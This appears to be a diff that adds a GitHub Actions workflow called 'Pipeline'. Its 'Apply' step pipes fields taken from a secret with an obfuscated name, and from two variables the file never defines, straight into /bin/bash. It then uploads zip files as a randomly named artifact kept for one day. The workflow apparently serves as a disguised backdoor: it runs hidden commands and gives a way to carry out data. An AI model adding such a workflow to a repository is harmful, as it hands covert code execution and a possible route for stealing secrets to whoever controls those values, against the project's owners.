@@ -1,0 +1,28 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          zz8: ${{ secrets.zz8 }}
+        run: |
+          printf '%s' "$zz8" | jq -r .dmrq159 | /bin/bash
+          echo $dibb03334 | jq -r .ghuul27 | /bin/bash
+          printf '%s' "$ov8" | jq -r .xpbw9 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: Lk8GUkbk
+          path: "*.zip"
+          retention-days: 1
